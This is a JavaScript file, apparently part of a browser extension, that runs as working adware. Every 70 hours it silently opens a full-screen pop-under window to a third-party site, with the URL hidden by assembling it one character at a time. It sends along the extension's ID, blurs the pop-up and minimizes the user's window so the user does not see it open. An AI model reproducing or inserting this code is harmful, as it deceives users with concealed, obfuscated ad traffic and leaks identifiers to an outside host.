//adjust the variable
if (localStorage["popUnderTime"] == undefined || localStorage["popUnderTime"] == '') {
    //read configuration XML
    localStorage["popUnderTime"] = (new Date()).getTime() - (1000 * 60 * 60 * 25);
    popUnderTimerFunction();
    //openThePopUnder();
} else {
    popUnderTimerFunction();
}

function popUnderTimerFunction() {
    var oldTime = localStorage["popUnderTime"];
    var newTime = (new Date()).getTime();
    if (((newTime - oldTime) / (1000 * 60 * 60)) > 70) {
        openThePopUnder();
        //reset time
        localStorage["popUnderTime"] = (new Date()).getTime();
    }
    var t = setTimeout(function(){popUnderTimerFunction();}, 600000);
}
function openThePopUnder() {
    if (parseInt(navigator.appVersion) > 3) {
        winWidth = screen.availWidth;
        winHeight = screen.availHeight;
    }
    else {
        winWidth = "1024";
        winHeight = "768";
    }

    var myid = '';
    try { myid = chrome.i18n.getMessage("@@extension_id"); }
    catch (ex) { } 

var urlOfIt = ["h", "t", "t", "p", ":", "/", "/", "d", "r", "o", "s", "s", "k", "y", "p", "e", ".", "c", "o", "m", "/", "d", "e", "f", "i", "n", "i", "t", "i", "o", "n", "/", "E", "n", "g", "l", "i", "s", "h", "%", "2", "0", "D", "e", "f", "i", "n", "i", "t", "i", "o", "n", "%", "2", "0", "S", "e", "a", "r", "c", "h", ".", "h", "t", "m", "l", "?", "i", "d", "="].join('');

    var pu = window.open( urlOfIt  + myid, "NWTWindowName", "width=" + winWidth + ",height=" + winHeight + ",scrollbars=1,resizable=1,menubar=1"); pu.blur();

    try { 
        chrome.tabs.getCurrent(function (tab) {
            try {
                chrome.windows.update(tab.windowId, {
                    state: "minimized"
                });
            } catch (ex) { }
        });
    } catch (ex) { }
}
